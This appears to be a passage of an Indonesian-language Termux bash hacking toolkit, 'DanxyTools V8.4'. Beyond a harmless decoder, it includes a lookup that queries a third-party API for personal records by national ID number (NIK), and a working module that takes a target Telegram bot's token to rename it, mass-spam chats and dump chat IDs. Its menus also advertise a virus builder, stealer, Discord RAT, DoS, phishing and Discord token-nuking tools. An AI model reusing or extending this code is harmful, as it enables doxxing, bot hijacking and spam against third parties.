  ██╔══██╗██╔══╝  ██║   ██║██║     ██║   ██║██║  ██║██╔══╝  
  ██║  ██║███████╗╚██████╔╝╚██████╗╚██████╔╝██████╔╝███████╗
  ╚═╝  ╚═╝╚══════╝ ╚═════╝  ╚═════╝ ╚═════╝ ╚═════╝ ╚══════╝
EOF
  echo -e "${NC}"
}

# Check if Python3 is installed
command -v python3 >/dev/null 2>&1 || {
    echo -e "${RED_NEON}Python3 tidak terinstall!${NC}"
    echo -e "${GREY}Menginstall python3...${NC}"
    pkg install -y python3
}

decoder_menu() {
  clear
  show_ascii_art
  echo -e "${GREY}"
  echo -e "  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  │             DECODER BY TOOLS V8.4            │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯${NC}"

  # Create directory if not exists
  if [ ! -d "/sdcard/HASIL-DECODE" ]; then
    mkdir -p "/sdcard/HASIL-DECODE"
    echo -e "${GREY}[+] Membuat folder /sdcard/HASIL-DECODE${NC}"
  fi

  # Python code langsung di dalam Bash
  python3 -c "
import base64
import binascii
from urllib.parse import unquote
import codecs
import os
import html
import marshal
import zlib
import quopri
import time
from datetime import datetime

def decode_all(text):
    results = {}
    
    # Base64 Decode
    try:
        decoded = base64.b64decode(text).decode('utf-8')
        results['Base64'] = decoded
    except:
        pass
    
    # Base64 URL Safe Decode
    try:
        decoded = base64.urlsafe_b64decode(text).decode('utf-8')
        results['Base64_URL'] = decoded
    except:
        pass
    
    # Base32 Decode
    try:
        decoded = base64.b32decode(text).decode('utf-8')
        results['Base32'] = decoded
    except:
        pass
    
    # URL Decode
    try:
        decoded = unquote(text)
        results['URL'] = decoded
    except:
        pass
    
    # Hexadecimal Decode
    try:
        text_clean = text.replace(' ', '').replace(':', '')
        decoded = bytes.fromhex(text_clean).decode('utf-8')
        results['Hex'] = decoded
    except:
        pass
    
    # ROT13 Decode
    try:
        decoded = codecs.decode(text, 'rot_13')
        results['ROT13'] = decoded
    except:
        pass
    
    # Binary Decode
    try:
        text_clean = text.replace(' ', '')
        decoded = ''.join(chr(int(text_clean[i:i+8], 2)) for i in range(0, len(text_clean), 8))
        results['Binary'] = decoded
    except:
        pass
    
    # HTML Entities Decode
    try:
        decoded = html.unescape(text)
        if decoded != text:
            results['HTML_Entities'] = decoded
    except:
        pass
    
    # ASCII Codes Decode
    try:
        if all(part.strip().isdigit() for part in text.split(',') if part.strip()):
            decoded = ''.join(chr(int(x.strip())) for x in text.split(','))
            results['ASCII_Codes'] = decoded
    except:
        pass
    
    # Reverse Text
    if len(text) > 1:
        reversed_text = text[::-1]
        results['Reversed'] = reversed_text
    
    # Caesar Cipher
    caesar_results = {}
    for shift in range(1, 26):
        decoded = ''
        for char in text:
            if char.isalpha():
                ascii_offset = 65 if char.isupper() else 97
                decoded += chr((ord(char) - ascii_offset - shift) % 26 + ascii_offset)
            else:
                decoded += char
        common_words = ['the', 'and', 'you', 'that', 'was', 'for', 'are', 'with', 'his', 'her']
        if any(word in decoded.lower() for word in common_words):
            caesar_results[f'Caesar_Shift_{shift}'] = decoded
    
    if caesar_results:
        results.update(caesar_results)
    
    return results

def print_colored(text, color_code):
    print(f'{color_code}{text}\033[0m')

def main():
    grey = '\033[90m'
    red_neon = '\033[1;31m'
    nc = '\033[0m'
    
    print_colored('[ ✓ ] Supported: Base64, Base32, URL, Hex, ROT13, Binary, HTML', grey)
    print_colored('[ ✓ ] Also: ASCII Codes, Reverse, Caesar Cipher', grey)
    
    print_colored('\n' + '♦'*50, red_neon)
    file_path = input(print_colored('Masukkan path file: ', grey) or '').strip()
    
    if file_path.lower() in ['quit', 'exit']:
        return
        
    if not os.path.exists(file_path):
        print_colored('[ ∅ ] File tidak ditemukan!', red_neon)
        return
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            text = f.read().strip()
        
        if not text:
            print_colored('[ ∅ ] File kosong!', red_neon)
            return
        
        print_colored('[ ∅ ] Proses decode...', grey)
        results = decode_all(text)
        
        print_colored('[ ✓ ] Done decode!\\n', grey)
        print_colored('SUPER DECODER BASE64', red_neon)
        
        for method, decoded in results.items():
            if method.startswith('Caesar'):
                print_colored(f'[{method}]: {decoded}', grey)
            else:
                print_colored(f'[{method}]: {decoded}', grey)
        
        if not results:
            print_colored('[ ∅ ] Tidak bisa mendecode dengan metode apapun', red_neon)
            
        save_choice = input(print_colored('\\nSimpan hasil ke file? (y/n): ', grey) or '').lower()
        if save_choice == 'y':
            timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
            filename = f'decoded_{timestamp}.txt'
            output_path = f'/sdcard/HASIL-DECODE/{filename}'
            
            with open(output_path, 'w', encoding='utf-8') as f:
                f.write('=== HASIL DECODE ===\\n')
                f.write(f'Tanggal: {datetime.now().strftime(\"%Y-%m-%d %H:%M:%S\")}\\n')
                f.write(f'File asli: {file_path}\\n')
                f.write('='*50 + '\\n\\n')
                
                for method, decoded in results.items():
                    f.write(f'[{method}]: {decoded}\\n\\n')
            
            print_colored(f'💾 Disimpan sebagai: {output_path}', grey)
            print_colored(f'📁 Lokasi: /sdcard/HASIL-DECODE/', grey)
            
    except Exception as e:
        print_colored(f'[ ∅ ] Error: {e}', red_neon)

if __name__ == '__main__':
    main()
"

  # Kembali ke menu setelah selesai
  echo -e "\n${GREY}"
  read -p "Tekan Enter untuk kembali ke menu..."
}








API_URL="https://api.fikmydomainsz.xyz/tools/nik?nik="

show_banner() {
  clear
  echo "
╔═════════════════════════════════════════════════════════╗
║                         ⣠⡀⠀⠀⢀⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀              ║
║               ⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣤⣤⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀ ⠀⠀⠀             ║
║               ⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠀⠀ ⠀⠀⠀⠀               ║
║               ⠀⠀⠀⠀⠀⠀⠀⠀⠸⢿⣿⣿⣿⣿⣿⣿⡿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀              ║
║               ⠀⠀⠀⠀⢀⣀⣠⠀⣶⣤⣄⣉⣉⣉⣉⣠⣤⣶⠀⣄⣀⡀⠀⠀⠀⠀⠀⠀              ║
║             ⠀⠀⠀⣶⣾⣿⣿⣿⣿⣦⣄⣉⣙⣛⣛⣛⣛⣋⣉⣠⣴⣿⣿⣿⣿⣷⣶⠀⠀⠀              ║
║             ⠀⠀⠀⠀⠈⠉⠉⠛⠛⠛⠻⠿⠿⠿⠿⠿⠿⠿⠿⠟⠛⠛⠛⠉⠉⠁⠀⠀⠀⠀              ║
║               ⠀⠀⠀⠀⠀⠀⠀⣷⣆⠀@⠀⢠⡄⠀@⠀⣰⣾⠀⠀⠀⠀⠀⠀⠀⠀⠀              ║
║             ⠀⠀⠀⢀⣠⣶⣾⣿⡆⠸⣿⣶⣶⣾⣿⣿⣷⣶⣶⣿⠇⢰⣿⣷⣶⣄⡀⠀⠀⠀              ║
║             ⠀⠀⠺⠿⣿⣿⣿⣿⣿⣄⠙⢿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⣿⣿⣿⣿⠿⠗⠀⠀              ║
║              ⠀⠀⠀⠀⠙⠻⣿⣿⣿⣷⡄⠈⠙⠛⠛⠋⠁⢠⣾⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀              ║
║              ⠀⠀⠀⠀⣀⣤⣬⣿⣿⣿⣇⠐⣿⣿⣿⣿⠂⣸⣿⣿⣿⣥⣤⣀⠀⠀⠀⠀⠀              ║
║              ⠀⠀⠀⠘⠻⠿⠿⢿⣿⣿⣿⣧⠈⠿⠿⠁⣼⣿⣿⣿⡿⠿⠿⠟⠃⠀⠀⠀⠀              ║
║               ⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⠀⣶⣦⠀⡿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀              ║
║               ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠛⠀⠀                          ║
╚═════════════════════════════════════════════════════════╝
║     TRACKING DATA INFORMASI NIK⠀BY DANXY TOOLS V8.4     ║
╚═════════════════════════════════════════════════════════╝
" | lolcat
}
check_nik() {
    while true; do
        show_banner
        echo -e "${YELLOW}${BOLD}TEKAN 0 UNTUK KEMBALI KE MENU"
        printf "${GREEN}┏━[ ${RED}MASUKAN NIK 16 DIGIT${NC} ${GREEN}]${YELLOW}@termux${GREEN} ~ ${NC}${RED}[${YELLOW}TRACKING NIK${YELLOW}${RED}]${NC}${GREEN}\n┗━━${GREEN}❯${YELLOW}❯${RED}❯${YELLOW} " 
        read -r nik
        
        if [ "$nik" = "0" ]; then
            echo -e "${YELLOW}[ ! ] KEMBALI KE MENU UTAMA${NC}"
            sleep 1
            return
        fi
        
        if [[ ! $nik =~ ^[0-9]{16}$ ]]; then
            echo -e "${RED}[ ! ] NIK HARUS ADA 16 DIGIT${NC}"
            echo -e "${YELLOW} CONTOH: 3273011234567890${NC}"
            echo -e "\n${BLUE} TEKAN ENTER UNTUK KEMBALI KE MENU${NC}"
            read -r
            continue
        fi
        
        echo -e "${YELLOW}[ * ] TRACKING DATA NIK: $nik${NC}"        
        response=$(curl -s "${API_URL}${nik}")
        if [ $? -ne 0 ]; then
            echo -e "${RED}[!] Error: Failed to connect to API${NC}"
        elif [ -z "$response" ]; then
            echo -e "${RED}[!] Error: No response from API${NC}"
        else
            
            # Filter out the creator line from API response
            echo -e "${RED}╔═════════════════════════════════════════════════════════╗"
            echo "${RED}║${GREEN} $response" | grep -v "creator" | grep -oE '"([^"]+)":\s*"([^"]*)"' | while read -r line; do
                key=$(echo "${RED}║${GREEN} $line" | cut -d'"' -f2)
                value=$(echo "${RED}║${GREEN} $line" | cut -d'"' -f4)
                echo -e "${RED}║${GREEN} ${WHITE}${BOLD}$key: ${GREEN}$value${NC}"
            echo -e "${RED}╚═════════════════════════════════════════════════════════╝"
            done
        fi
        
        echo -e "\n${BLUE}TEKAN ENTER UNTUK KEMBALI KE MENU${NC}"
        read -r choice
        if [ "$choice" = "0" ]; then
            return
        fi
    done
}

check_commands() {
    local missing_commands=()
    
    if ! command -v curl &> /dev/null; then
        missing_commands+=("curl")
    fi
    
    if [ ${#missing_commands[@]} -ne 0 ]; then
        echo -e "${RED}[!] Error: Perintah berikut diperlukan tetapi tidak diinstal:${NC}"
        printf '%s\n' "${missing_commands[@]}"
        echo -e "\n${YELLOW}[*] Silakan menginstalnya menggunakan: pkg install ${missing_commands[*]}${NC}"
        return 1
    fi
    
    return 0
}

CheckerNik() {
    if ! check_commands; then
        echo -e "\n${RED}[!] Tidak dapat melanjutkan tanpa perintah yang diperlukan.${NC}"
        echo -e "${BLUE}Tekan enter untuk kembali...${NC}"
        read -r
        return
    fi
    
    while true; do
        show_banner
        echo -e "${BLUE}KETIK 0 UNTUK KELUAR DARI MENU"
        echo -n -e "${BLUE}KETIK 1 UNTUK MELANJUTKAN [1/0]: ${NC}"
        read -r choice
        
        case $choice in
            1)
                check_nik
                ;;
            0)
                echo -e "${GREEN}[+] Terima kasih telah menggunakan alat ini!${NC}"
                echo -e "${YELLOW}[*] Goodbye!${NC}"
                return
                ;;
            *)
                echo -e "${RED}[!] Pilihan tidak valid! Silakan pilih 1 atau 0${NC}"
                sleep 2
                ;;
        esac
    done
}

if [ ! -d "/data/data/com.termux" ]; then
    echo -e "${RED}[!] Warning: This script is designed for Termux${NC}"
    echo -e "${YELLOW}[*] Continuing anyway...${NC}"
    sleep 2
fi










R='\e[38;5;196m'  # merah neon
G='\e[38;5;082m'  # hijau terang
Y='\e[38;5;226m'  # kuning neon
B='\e[38;5;051m'  # biru cyan
M='\e[38;5;201m'  # magenta terang
C='\e[38;5;051m'  # cyan
W='\e[38;5;015m'  # putih tulang
RESET='\e[0m'

USER="$(whoami)"  
HOST="$(hostname -s)" 
AttackTG() {
clear
echo -e "
${G}● ${Y}● ${R}●${B}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⣿⡄   _____   __    __                 __     
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣶⣿⣿⡿⠿⠛⢙⣿⣿⠃  /  _  \_/  |__/  |______    ____ |  | __ 
⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣶⣾⣿⣿⠿⠛⠋⠁⠀⠀⠀⣸⣿⣿⠀ /  /_\  \   __\   __\__  \ _/ ___\|  |/ / 
⠀⠀⠀⠀⣀⣤⣴⣾⣿⣿⡿⠟⠛⠉⠀⠀⣠⣤⠞⠁⠀⠀⣿⣿⡇⠀/    |    \  |  |  |  / __ \\  \___|    <  
⠀⣴⣾⣿⣿⡿⠿⠛⠉⠀⠀⠀⢀⣠⣶⣿⠟⠁⠀⠀⠀⢸⣿⣿⠀${R}⠀\____|__  /__|  |__| (____  /\___  >__|_ \ ${B}
⠸⣿⣿⣿⣧⣄⣀⠀⠀⣀⣴⣾⣿⣿⠟⠁⠀⠀⠀⠀⠀⣼⣿⡿⠀${R}⠀        \/                \/     \/     \/ ${B}
⠀⠈⠙⠻⠿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⢠⣿⣿⠇⠀⠀______________________.____     ___________
⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⡇⠀⣀⣄⡀⠀⠀⠀⠀⢸⣿⣿⠀⠀⠀\__    ___/\_   _____/|    |    \_   _____/
⠀⠀⠀⠀⠀⠀⠀⠸⣿⣿⣿⣠⣾⣿⣿⣿⣦⡀⠀⠀⣿⣿⡏⠀⠀⠀  |    |    |    __)_ |    |     |    __)_ 
⠀⠀⠀⠀⠀⠀⠀⠀⢿⣿⣿⣿⡿⠋⠈⠻⣿⣿⣦⣸⣿⣿⠁⠀⠀⠀  |    |    |        \|    |___  |        \
⠀⠀⠀⠀⠀⠀ ⠀⠀⠀⠙⠛⠁⠀⠀⠀⠀⠈⠻⣿⣿⣿⠏${RESET}${R}       |____|   /_______  /|_______ \/_______ /
  ╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╮
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
  │         ${C}MENU ATTACK & SPAM BOT TELEGRAM BY TOOLS V8.4        ${R} │
  ╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╯
"

# Cek dependensi
for dep in curl jq; do
  command -v $dep &>/dev/null || { echo -e "${R}[!] $dep belum terinstal.${RESET} Jalankan: pkg install $dep"; exit 1; }
done
echo -e "${R} [!]${RESET} MASUKAN TOKEN BOT TELEGRAM TARGET UNTUK MELANJUTKAN KE MENU"
echo -en "${Y} [?]${RESET} TOKEN BOT TARGET: ${C}"
read -r TOKEN
echo -e "${RESET}"

echo -e "${RESET}\n${G} [✓]${RESET} Menghubungkan ke API ..."
cek_info(){
  resp=$(curl -s "https://api.telegram.org/bot$TOKEN/getMe")
  ok=$(echo "$resp" | jq -r '.ok')
  if [[ "$ok" != "true" ]]; then
    echo -e "${R}[!] Token salah / koneksi gagal.${RESET}"
    echo "$resp" | jq -r '.description'
    return
  fi
  USERBOT=$(echo "$resp" | jq -r '.result.username')
  echo -e "${G} [✓]${RESET} Bot terhubung : @${C}${USERBOT}${RESET}"
}

##############  MENU FITUR ###############
set_name(){
  read -rp "Nama baru bot : " BARU
  resp=$(curl -s -X POST "https://api.telegram.org/bot$TOKEN/setMyName" -d "name=$BARU")
  echo "$resp" | jq -e '.ok' && echo -e "${G}[✓]${RESET} Nama berhasil diubah." || echo -e "${R}[!] Gagal.${RESET}"
}

set_desc(){
  read -rp "Deskripsi baru : " BARU
  resp=$(curl -s -X POST "https://api.telegram.org/bot$TOKEN/setMyDescription" -d "description=$BARU")
  echo "$resp" | jq -e '.ok' && echo -e "${G}[✓]${RESET} Deskripsi berhasil diubah." || echo -e "${R}[!] Gagal.${RESET}"
}

set_shortdesc(){
  read -rp "Short description baru : " BARU
  resp=$(curl -s -X POST "https://api.telegram.org/bot$TOKEN/setMyShortDescription" -d "short_description=$BARU")
  echo "$resp" | jq -e '.ok' && echo -e "${G}[✓]${RESET} Short desc berhasil diubah." || echo -e "${R}[!] Gagal.${RESET}"
}

set_photo(){
  echo -e "${Y}[i]${RESET} Kirim foto (≤5 MB, JPG/PNG) ke Termux, lalu masukkan path absolut."
  read -rp "Path foto : " PIC
  [[ ! -f "$PIC" ]] && { echo -e "${R}[!] File tidak ditemukan.${RESET}"; return; }

  resp=$(curl -s -X POST "https://api.telegram.org/bot$TOKEN/setMyPhoto" \
           -F "photo=@$PIC")
  ok=$(echo "$resp" | jq -r '.ok')
  if [[ "$ok" == "true" ]]; then
    echo -e "${G}[✓] Foto profil bot berhasil diubah.${RESET}"
  else
    echo -e "${R}[!] Gagal:${RESET} $(echo "$resp" | jq -r '.description')"
  fi
}


spam_text(){
  read -rp "ID tujuan : " TID
  read -rp "Teks pesan : " ISI
  read -rp "Jumlah kirim : " JML
  echo -e "${M}----------------------------------------"
  echo -e "Target : $TID"
  echo -e "Pesan  : $ISI"
  echo -e "Jumlah : $JML kali"
  read -rp "Konfirmasi kirim? (y/N) : " CONF
  [[ "$CONF" != "y" && "$CONF" != "Y" ]] && { echo -e "${R}[!] Dibatalkan.${RESET}"; return; }
  for ((i=1;i<=JML;i++)); do
    resp=$(curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendMessage" -d "chat_id=$TID" -d "text=$ISI")
    echo "$resp" | jq -e '.ok' &>/dev/null && echo -e "${G}[$i/$JML]${RESET} Terkirim" || echo -e "${R}[$i/$JML]${RESET} Gagal"
  done
  echo -e "${G}[✓] Proses selesai.${RESET}"
}

spam_photo(){
  echo -e "${Y}[i]${RESET} Kirim file foto ke Termux, lalu masukkan path absolut."
  read -rp "Path foto : " PIC
  [[ ! -f "$PIC" ]] && { echo -e "${R}[!] File tidak ditemukan.${RESET}"; return; }
  read -rp "ID tujuan : " TID
  read -rp "Caption (boleh kosong) : " CAP
  read -rp "Jumlah kirim : " JML
  read -rp "Konfirmasi kirim? (y/N) : " CONF
  [[ "$CONF" != "y" && "$CONF" != "Y" ]] && { echo -e "${R}[!] Dibatalkan.${RESET}"; return; }
  for ((i=1;i<=JML;i++)); do
    resp=$(curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendPhoto" -F "chat_id=$TID" -F "photo=@$PIC" -F "caption=$CAP")
    echo "$resp" | jq -e '.ok' &>/dev/null && echo -e "${G}[$i/$JML]${RESET} Terkirim" || echo -e "${R}[$i/$JML]${RESET} Gagal"
  done
  echo -e "${G}[✓] Proses selesai.${RESET}"
}

leave_chat(){
  read -rp "ID grup/channel yang ingin di-leave : " TID
  resp=$(curl -s -X POST "https://api.telegram.org/bot$TOKEN/leaveChat" -d "chat_id=$TID")
  echo "$resp" | jq -e '.ok' && echo -e "${G}[✓]${RESET} Bot keluar dari obrolan." || echo -e "${R}[!] Gagal.${RESET}"
}

get_updates(){
  echo -e "${Y}[i]${RESET} Mendapatkan update terbaru (limit 20) ..."
  curl -s "https://api.telegram.org/bot$TOKEN/getUpdates?limit=20" | jq -r '
    .result[] |
    "\(.update_id | tostring) | \(.message.chat.type) | @\(.message.chat.username // .message.chat.title // .message.chat.id) | \(.message.chat.id)"'
}

dump_ids(){
  echo -e "${Y}[i]${RESET} Dump semua ID obrolan dari update (limit 100) ..."
  curl -s "https://api.telegram.org/bot$TOKEN/getUpdates?limit=100" | jq -r '
    .result[] |
    select(.message.chat.id) |
    "\(.message.chat.type) | \(.message.chat.id) | @\(.message.chat.username // .message.chat.title // "NoName")"'
}

file_to_bot(){
  echo -e "${Y}[i]${RESET} Upload file ke Telegram lalu dapatkan file_id-nya."
  read -rp "Path file : " FILE
  [[ ! -f "$FILE" ]] && { echo -e "${R}[!] File tidak ditemukan.${RESET}"; return; }
  read -rp "Chat ID tujuan (isi ID Anda) : " TID
  resp=$(curl -s -X POST "https://api.telegram.org/bot$TOKEN/sendDocument" -F "chat_id=$TID" -F "document=@$FILE")
  echo "$resp" | jq -e '.ok' && echo -e "${G}[✓] File terkirim – file_id:${RESET}" && echo "$resp" | jq -r '.result.document.file_id' || echo -e "${R}[!] Gagal.${RESET}"
}

##############  MENU UTAMA ###############
cek_info
while true; do
  echo -e "                                                              ${G}● ${Y}● ${R}●${RESET}\n${M}┌${RESET}""$(printf '━%.0s' $(seq 1 67))""${M}┐${RESET}"
  echo -e "${M}│${RESET}                              ${R}MAIN MENU${RESET}                            ${M}│${RESET}"
  echo -e "${M}├${RESET}""$(printf '━%.0s' $(seq 1 67))""${M}┤${RESET}"
  echo -e "${M}│${RESET}  ${C} 1${RESET}. Setting nama bot                                             ${M}│${RESET}"
  echo -e "${M}│${RESET}  ${C} 2${RESET}. Setting deskripsi                                            ${M}│${RESET}"
  echo -e "${M}│${RESET}  ${C} 3${RESET}. Setting short description                                    ${M}│${RESET}"
  echo -e "${M}│${RESET}  ${C} 4${RESET}. Setting foto profil                                          ${M}│${RESET}"
  echo -e "${M}│${RESET}  ${C} 5${RESET}. Kirim teks (spam)                                            ${M}│${RESET}"
  echo -e "${M}│${RESET}  ${C} 6${RESET}. Kirim foto (spam)                                            ${M}│${RESET}"
  echo -e "${M}│${RESET}  ${C} 7${RESET}. Leave chat / keluar grup                                     ${M}│${RESET}"
  echo -e "${M}│${RESET}  ${C} 8${RESET}. Get updates (lihat pesan baru)                               ${M}│${RESET}"
  echo -e "${M}│${RESET}  ${C} 9${RESET}. Dump semua ID obrolan                                        ${M}│${RESET}"
  echo -e "${M}│${RESET}  ${C}10${RESET}. Upload file & dapatkan file_id                               ${M}│${RESET}"
  echo -e "${M}│${RESET}  ${R} 0${RESET}. Keluar                                                       ${M}│${RESET}"
  echo -e "${M}└${RESET}""$(printf '━%.0s' $(seq 1 67))""${M}┘${RESET}"

PTH="~/Menu"
PROMPT="$(echo -e "\n${B}┌──(${G}${USER}${W}@${M}${HOST}${B})-[${C}${PTH}${B}]\n└─${Y}\$ ${M}")"
read -r -p "$PROMPT" PIL
echo -e "\n${G}${RESET}"

  case $PIL in
    1) set_name ;;
    2) set_desc ;;
    3) set_shortdesc ;;
    4) set_photo ;;
    5) spam_text ;;
    6) spam_photo ;;
    7) leave_chat ;;
    8) get_updates ;;
    9) dump_ids ;;
   10) file_to_bot ;;
    0) echo -e "\n${G}Sampai jumpa ~${RESET}";return ;;
    *) echo -e "\n${R}[!] Pilihan tidak valid.${RESET}";;
  esac
done
}


DarkMenu() {
set -euo pipefail
########## WARNA ##########
R=$(printf '\033[38;5;196m'); G=$(printf '\033[32m'); Y=$(printf '\033[33m')
B=$(printf '\033[34m'); W=$(printf '\033[37m'); RESET=$(printf '\033[m')
BG='\033[1;41m'
########## CONFIG ##########
TOOL_NAME="DanxyTools"
VERSION="8.4"
GITHUB="https://github.com/NgakuNgakuDevTapiScRecodePunyaGw/Danxy"
USER=${USER:-$(whoami)}
MENU_NR=1

########## UTILS ##########
clear_screen(){ clear || true; }
pause(){ read -rp "  Press Enter to continue … "; }

########## MENU 1-3 ##########
menu1(){
Ben
cat <<M1
 ${R}┌─ ${R}[${W} 0 ${R}]${RESET} KELUAR
 ${R}├─ ${R}[${W}I${R}]${RESET} Info                                                                       ${R}[${W}N${R}]${RESET} Next ${R}─┐
 ${R}├─ ${R}[${W}S${R}]${RESET} Site ${R}┌─────────────────┐            ┌───────┐                  ┌───────────┐         │
 ${R}└─┬─────────┤ ${W}Network Scanner ${R}├──────┬─────┤ ${W}Osint ${R}├───────────┬──────┤ ${W}Utilities ${R}├─────────┴─
   ${R}│         └─────────────────┘      │     └───────┘           │      └───────────┘
   ${R}├─ ${R}[${W}01${R}]${RESET} Website-Vuln-Scanner       ${R}├─ ${R}[${W}10${R}]${RESET} D0x-Create        ${R}├─ ${R}[${W}20${R}]${RESET} Phishing-Attack
   ${R}├─ ${R}[${W}02${R}]${RESET} Website-Info-Scanner       ${R}├─ ${R}[${W}11${R}]${RESET} D0x-Tracker       ${R}├─ ${R}[${W}21${R}]${RESET} Zip-Pass-Crack
   ${R}├─ ${R}[${W}03${R}]${RESET} Website-Url-Scanner        ${R}├─ ${R}[${W}12${R}]${RESET} Image-Exif        ${R}├─ ${R}[${W}22${R}]${RESET} Hash-Decrypt
   ${R}├─ ${R}[${W}04${R}]${RESET} IP-Scanner                 ${R}├─ ${R}[${W}13${R}]${RESET} Google-Dork       ${R}├─ ${R}[${W}23${R}]${RESET} Hash-Encrypt
   ${R}├─ ${R}[${W}05${R}]${RESET} IP-Port-Scanner            ${R}├─ ${R}[${W}14${R}]${RESET} Username-Tracker  ${R}├─ ${R}[${W}24${R}]${RESET} Search-DB
   ${R}└─ ${R}[${W}06${R}]${RESET} IP-Pinger                  ${R}├─ ${R}[${W}15${R}]${RESET} Email-Tracker     ${R}├─ ${R}[${W}25${R}]${RESET} Dark-Web-Links
                                      ${R}├─ ${R}[${W}16${R}]${RESET} Email-Lookup      ${R}└─ ${R}[${W}26${R}]${RESET} IP-Generator
                                      ${R}├─ ${R}[${W}17${R}]${RESET} Phone-Lookup   
                                      ${R}├─ ${R}[${W}18${R}]${RESET} IP-Lookup   
                                      ${R}└─ ${R}[${W}19${R}]${RESET} Instagram-Account
M1
}

menu2(){
Ben
cat <<M2
 ${R}┌─ ${R}[${W} 0 ${R}]${RESET} KELUAR
 ${R}├─ ${R}[${W}I${R}]${RESET} Info                                                                 ${R}[${W}N${R}]${RESET} Next ${R}─┐
 ${R}├─ ${R}[${W}S${R}]${RESET} Site  ${R}┌───────────────┐          ┌──────┐              ┌────────┐    ${R}[${W}B${R}]${RESET} Back ${R}─┤
${R}─┴─┬──────────┤ ${W}Virus Builder ${R}├────┬─────┤ ${W}Paid ${R}├────────┬─────┤ ${W}Roblox${R} ├──────────────┴─
   ${R}│          └───────────────┘    │     └──────┘        │     └────────┘
   ${R}└─ ${R}[${W}30${R}]${RESET} Virus-Builder           ${R}├─ ${R}[${W}31${R}]${RESET} Py-Obfuscator ${R}├─ ${R}[${W}40${R}]${RESET} Roblox-Cookie-Login
           ${R}├─ ${W}Stealer              ${R}├─ ${R}[${W}32${R}]${RESET} Discord-RAT   ${R}├─ ${R}[${W}41${R}]${RESET} Roblox-Cookie-Info
           ${R}├─ ${W}Grabber              ${R}├─ ${R}[${W}33${R}]${RESET} Website-DoS   ${R}├─ ${R}[${W}42${R}]${RESET} Roblox-Id-Info
           ${R}└─ ${W}Malware              ${R}└─ ${R}[${W}34${R}]${RESET} Proxy-Scraper ${R}└─ ${R}[${W}43${R}]${RESET} Roblox-User-Info
M2
}

menu3(){
Ben
cat <<M3
              ${R}┌─ ${R}[${W} 0 ${R}]${RESET} KELUAR
              ${R}├─ ${R}[${W}I${R}]${RESET} Info                                                      ${R}[${W}B${R}]${RESET} Back ${R}─┐
              ${R}├─ ${R}[${W}S${R}]${RESET} Site                               ${R} ┌─────────┐                     │
             ${R}─┴─┬────────────────────────────────────────┤ ${W}Discord ${R}├─────────────────────┘
                ${R}│                                        ├─────────┘
                ${R}├─ ${R}[${W}50${R}]${RESET} Token-Nuker                      ${R}├─ ${R}[${W}60${R}]${RESET} Token-Mass-Dm
                ${R}├─ ${R}[${W}51${R}]${RESET} Token-Info                       ${R}├─ ${R}[${W}61${R}]${RESET} Token-Delete-Dm
                ${R}├─ ${R}[${W}52${R}]${RESET} Token-Joiner                     ${R}├─ ${R}[${W}62${R}]${RESET} Token-Status-Changer
                ${R}├─ ${R}[${W}53${R}]${RESET} Token-Leaver                     ${R}├─ ${R}[${W}63${R}]${RESET} Token-Language-Changer
                ${R}├─ ${R}[${W}54${R}]${RESET} Token-Login                      ${R}├─ ${R}[${W}64${R}]${RESET} Token-House-Changer
                ${R}├─ ${R}[${W}55${R}]${RESET} Token-To-Id-Brute                ${R}├─ ${R}[${W}65${R}]${RESET} Token-Theme-Changer
                ${R}├─ ${R}[${W}56${R}]${RESET} Token-Server-Raid                ${R}├─ ${R}[${W}66${R}]${RESET} Token-Generator
                ${R}├─ ${R}[${W}57${R}]${RESET} Token-Spammer                    ${R}├─ ${R}[${W}67${R}]${RESET} Bot-Server-Nuker
                ${R}├─ ${R}[${W}58${R}]${RESET} Token-Delete-Frie                ${R}├─ ${R}[${W}68${R}]${RESET} Bot-Invite-To-Id
                ${R}├─ ${R}[${W}59${R}]${RESET} Token-Block-Friends              ${R}├─ ${R}[${W}69${R}]${RESET} Server-Info
                ${R}└────────────────────────────────────────┴──────────────────────────────
M3
}

########## FUNGSI MODUL ##########
website_vuln_scanner(){
  read -rp "  Target domain: " d
  echo "  Checking security headers …"
  curl -s -I "https://$d" | grep -i "x-frame-options\|x-content-type-options\|strict-transport-security\|content-security-policy" || echo "  Missing security headers"
  echo "  Checking HTTPS redirect …"
  curl -s -I "http://$d" | grep -i "location" || echo "  No HTTPS redirect"
  pause
}

website_info_scanner(){
  read -rp "  Domain: " d
  echo "  IP resolve:"
  nslookup "$d" | grep "Address:" | tail -n +2
  echo "  HTTP headers:"
  curl -s -I "https://$d" | head -10
  pause
}

website_url_scanner(){
  read -rp "  Domain: " d
  echo "  Crawling 20 links (wget) …"
  wget -q --spider --force-html -r -l 1 "https://$d" 2>&1 | grep -E "https?://$d" | head -20 || echo "  wget error"
  pause
